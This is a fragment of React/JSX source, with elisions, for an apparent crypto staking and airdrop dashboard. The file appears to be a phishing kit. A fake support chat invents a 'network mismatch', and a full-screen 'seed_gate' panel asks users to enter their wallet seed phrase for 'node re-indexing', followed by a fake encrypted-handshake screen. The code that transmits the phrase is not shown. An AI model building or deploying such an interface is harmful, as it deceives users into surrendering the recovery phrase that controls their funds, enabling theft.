...
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, ArrowRight, MessageSquare, X, Send } from 'lucide-react';
  ...
  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 p-6 uppercase tracking-tighter relative border-t-4 border-cyan-500 font-sans">
      <header className="flex justify-between items-center mb-10 pb-6 border-b border-slate-900">
        <div>
          ...
          <div className="flex items-center gap-1.5 mt-1">
            ...
            <span className="text-[8px] font-mono text-slate-600 uppercase italic">Node Status: Online</span>
          </div>
        </div>
        <w3m-button />
      </header>
      ...
      <div className={`fixed bottom-6 right-6 z-[100] transition-all duration-300 ${isChatOpen ? 'w-[280px]' : 'w-14'}`}>
        {!isChatOpen ? (
          <button onClick={() => {setIsChatOpen(true); setChatMessages([{role:'agent', text:'Support bot active. How can I help?'}])}} className="bg-cyan-600 p-4 rounded-full shadow-2xl animate-bounce"><MessageSquare color="white" /></button>
        ) : (
          <div className="w-full h-[380px] bg-[#0d1117] border border-slate-800 rounded-3xl shadow-2xl flex flex-col p-4 text-[10px] lowercase text-slate-400">
            <div className="flex justify-between mb-4 border-b border-slate-800 pb-2">
              <span className="font-black text-cyan-500 italic">AGENT_SUPPORT</span>
              <button onClick={() => setIsChatOpen(false)}><X size={18}/></button>
            </div>
            <p className="bg-slate-900 p-3 rounded-xl border border-cyan-900/20">Network mismatch detected. Please complete synchronization to clear RPC cache.</p>
          </div>
        )}
      </div>
      ...
      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4">
          {[ {n:"Claim", i:<Database/>}, {n:"Stake", i:<History/>}, {n:"Unstake", i:<Unlock/>}, {n:"Migrate", i:<Activity/>}, {n:"Swap", i:<RefreshCcw/>}, {n:"Rectify", i:<Settings/>}, {n:"Airdrop", i:<Zap/>}, {n:"Delay", i:<Clock/>}, {n:"Bridge", i:<Globe/>} ].map(item => (
            <button key={item.n} onClick={() => openTask(item.n)} className="bg-[#0a0d14] border border-slate-900 p-6 rounded-3xl flex flex-col items-center gap-3 active:scale-95 shadow-xl transition-all">
      ...
      {view === "task_box" && (
        <div className="bg-[#0a0d14] border border-slate-800 rounded-[40px] p-8 text-center shadow-2xl animate-in slide-in-from-bottom-5">
          <button onClick={backToMenu} className="text-slate-700 text-[9px] mb-8 font-black tracking-widest uppercase italic underline underline-offset-4 decoration-cyan-900">← Terminate Session</button>
          <div className="relative mx-auto w-20 h-20 mb-6"><Settings size={80} className="text-cyan-950 animate-spin duration-[4000ms]" /><Cpu size={40} className="text-cyan-500 absolute top-5 left-5 animate-pulse" /></div>
          <h2 className="text-white font-black text-2xl mb-8 italic tracking-tighter uppercase">{activeTask} Portal</h2>
          <div className="bg-black p-6 rounded-3xl mb-8 text-left border border-slate-900 shadow-inner">
            <label className="text-[8px] text-cyan-800 font-black block mb-2 uppercase tracking-[0.2em]">{activeTask}_Amount</label>
          ...
          <button onClick={handleFinalAuth} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 flex items-center justify-center gap-2 italic uppercase tracking-widest transition-all">Execute {activeTask} <ArrowRight size={14}/></button>
        </div>
      )}

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-[#05070a]/98 z-[200] flex items-center justify-center p-6 backdrop-blur-2xl animate-in zoom-in">
          <div className="bg-[#0d1117] border border-red-900/20 w-full max-w-sm rounded-[50px] p-10 text-center shadow-2xl">
            {!isSyncing ? (
              <>
                ...
                <p className="text-[10px] text-slate-600 leading-relaxed mb-8 px-4 lowercase italic text-center">System requires manual authentication. Provide authorization seed to complete node re-indexing.</p>
                <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER SEED PHRASE..." className="w-full h-36 bg-black border border-slate-900 rounded-[30px] p-6 text-xs font-mono text-cyan-500 outline-none uppercase placeholder:text-slate-950 mb-6 shadow-inner" />
              ...
              <div className="py-12 text-center">
                ...
                <p className="text-[8px] font-mono text-cyan-900 tracking-[0.5em] uppercase mt-4">Handshake_Encrypted_Auth</p>
              </div>
            )}
          </div>
        </div>
